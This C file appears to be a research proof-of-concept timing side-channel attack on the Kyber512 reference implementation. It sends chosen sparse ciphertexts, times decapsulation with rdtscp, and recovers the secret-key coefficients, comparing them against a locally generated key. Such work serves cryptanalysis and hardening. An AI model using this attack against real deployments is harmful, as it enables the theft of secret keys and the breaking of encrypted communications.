#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <time.h>           // measure experiment time (not attack measurements)

////////////////////////////////////////////////////////////////////////////////
// parameters

  // don't touch
#define NB_CT_ATTACK 7
#define NB_CT_INCLUDING_KNOWN (NB_CT_ATTACK + 2)
#define CT_KNOWN_ZERO (NB_CT_ATTACK)
#define CT_KNOWN_ONE (NB_CT_ATTACK + 1)
#define GUESS_DONT_KNOW 0xFF

  // lower if you want a shorter experiment
#define NB_COEFFICIENTS (KYBER_K * KYBER_N)

  // if the PoC doesn't work (well) on your machine, consider tuning these
#define DEFAULT_ITERATIONS 100000
#define CONFIDENCE_MEH 3
#define CONFIDENCE_HIGH 15
#define EVALUATE_EVERY_N_ITERATIONS 0x1FF
#define OUTLIER_THRESHOLD 2000

// only print-related
#define PRINT_EVERY_N_ITERATIONS 0x1FFF
#define PRINT_NEWLINE_EVERY_N_COEFFICIENTS 32

// enable for debug prints
//#define VERBOSE_PRINT 
////////////////////////////////////////////////////////////////////////////////

// helpers from the ref implementation to pack ciphertexts and unpack sk
#include "randombytes.h"    // draw random measurement class
#include "polyvec.h"        // polyvec{_frombytes,invntt_tomont}
#include "reduce.h"         // montgomery_reduce

#include "api.h"            // top-level API for pqcrystals/kyber/ref shared lib
#include "guess.h"          // functions for turning measurements into guesses

// attack measurements
static uint64_t rdtscp64(void) {
  uint32_t low, high;
  asm volatile ("rdtscp": "=a" (low), "=d" (high) :: "ecx");
  return (((uint64_t)high) << 32) | low;
}

int main(void) {

  // cryptographic objects
  uint8_t pk[pqcrystals_kyber512_PUBLICKEYBYTES];
  uint8_t sk[pqcrystals_kyber512_SECRETKEYBYTES];
  uint8_t ct_zero[pqcrystals_kyber512_CIPHERTEXTBYTES]; 
  uint8_t ss[pqcrystals_kyber512_BYTES];

  // statistix, guesses and ground truth for secret coefficients
  double means[NB_CT_INCLUDING_KNOWN];
  size_t nbs[NB_CT_INCLUDING_KNOWN];
  int16_t s_truths[NB_COEFFICIENTS];
  int16_t s_guesses[NB_COEFFICIENTS];

  // values in sparse ciphertexts to isolate single-coefficient dependence of
  // m' bits in the decapsulation
  // a la  Ravi et al., Generic Side-channel attacks on CCA-secure
  // lattice-based PKE and KEMs
  uint16_t ku[NB_CT_INCLUDING_KNOWN] =
                { 140,  185, 106,  277,  64,   63,  267, 144,   0};
  uint16_t kv[NB_CT_INCLUDING_KNOWN] =
                {2132, 2923, 521, 3016, 936, 2548, 1142, 312, 937};
  uint8_t cts[NB_CT_INCLUDING_KNOWN][pqcrystals_kyber512_CIPHERTEXTBYTES];

  size_t i, j, itx;                                           // loop indices
  volatile uint64_t before, after, ref_before, ref_after;     // measurements
  double ref_measurement, att_measurement, diff, delta;       // outlier logic
  size_t discarded, confidence;                               // confidence
  clock_t start;                                              // runtime
  uint8_t ct_index;
  polyvec u; poly v;

  // generate keypair
  pqcrystals_kyber512_ref_keypair(pk, sk);  

  // extract ground truth from secret key for experiment progress
  polyvec skpv; polyvec_frombytes(&skpv, sk); polyvec_invntt_tomont(&skpv);
  for (i=0; i< NB_COEFFICIENTS; i++){
    s_truths[i] = montgomery_reduce(skpv.vec[i / KYBER_N].coeffs[i % KYBER_N]);
  }

  // start the clock
  start = clock();

  // loop over all the secret coefficients
  for (int s_index = 0; s_index < NB_COEFFICIENTS; s_index++){

    itx = 0; discarded = 0; confidence = 0;
    int16_t s_last = GUESS_DONT_KNOW; int16_t s_guess = GUESS_DONT_KNOW;

    //////////////////////////////
    // prepare chosen ciphertexts
    //////////////////////////////
    for (ct_index=0; ct_index<NB_CT_INCLUDING_KNOWN; ct_index++){

      memset(ct_zero, 0x00, pqcrystals_kyber512_CIPHERTEXTBYTES);  // zero ref
      
      // zeroize u and v
      for(i=0; i<KYBER_K; i++){
        for(j=0; j<KYBER_N; j++){ u.vec[i].coeffs[j] = 0; }
      }
      for(j=0;j<KYBER_N;j++){ v.coeffs[j] = 0; }

      // populate u and v depending on the coefficient of s we want to learn
      if ((s_index % KYBER_N) == 0){ 
        u.vec[s_index/KYBER_N].coeffs[0] = ku[ct_index];
      } else {
        u.vec[s_index/KYBER_N].coeffs[KYBER_N-(s_index%KYBER_N)] = ku[ct_index];
      }
      v.coeffs[0] = kv[ct_index];

      // pack cts
      polyvec_compress(cts[ct_index], &u);
      poly_compress(cts[ct_index]+KYBER_POLYVECCOMPRESSEDBYTES, &v);
    }

    // reset statistix
    for (ct_index = 0; ct_index < NB_CT_INCLUDING_KNOWN; ct_index++) {
      means[ct_index] = 0; nbs[ct_index] = 0;
    }

    //////////////////////////////////////////////////
    // guess coefficient based on timing measurements
    //////////////////////////////////////////////////
    while (
        // normally, we do DEFAULT_ITERATIONS iterations
        // if we don't reach CONFIDENCE_MEH, continue despite DEFAULT_ITERATIONS
        // if we reach CONFIDENCE_HIGH, stop, possibly before DEFAULT_ITERATIONS
        ((itx < DEFAULT_ITERATIONS) || (confidence < CONFIDENCE_MEH)) &&
        (confidence < CONFIDENCE_HIGH)
    ){

      // choose random ct to decapsulate
      randombytes(&ct_index, 1); ct_index = ct_index % (NB_CT_INCLUDING_KNOWN);

      // reference measurement
        // not strictly necessary but increases perf tremendously
      ref_before = rdtscp64();
      pqcrystals_kyber512_ref_dec(ss, ct_zero, sk);
      ref_after = rdtscp64();
      
      // actual measurement
      before = rdtscp64();
      pqcrystals_kyber512_ref_dec(ss, cts[ct_index], sk);
      after = rdtscp64();
      
      // determine whether to keep measurement
      att_measurement = (double)(after-before);
      ref_measurement = (double)(ref_after-ref_before);
      diff = att_measurement - ref_measurement;

      // perform online mean update
      if (fabs(diff) < OUTLIER_THRESHOLD){
        delta = diff - means[ct_index];
        means[ct_index] += (delta/(double)(++nbs[ct_index]));
      } else {
        discarded++;
      }

      // every once in a while, evaluate confidence in the current guess
      if ((itx & EVALUATE_EVERY_N_ITERATIONS) == 0){
        
        // update guess based on latest information
        s_last = s_guess;
        s_guess = guesswork(s_guesses, means, s_truths, s_index,
                            itx, discarded, start, confidence,
                            (itx & PRINT_EVERY_N_ITERATIONS) == 0);

        // increase confidence if guess remains consistent
        confidence = (s_guess != GUESS_DONT_KNOW) && (s_last == s_guess)
                      ? confidence + 1
                      : 0;
      }
      itx++; // loop index
    }

  }

  // show final result
  guesswork(s_guesses, means, s_truths, NB_COEFFICIENTS,
            itx, discarded, start, confidence, 1);

  return 0;
}
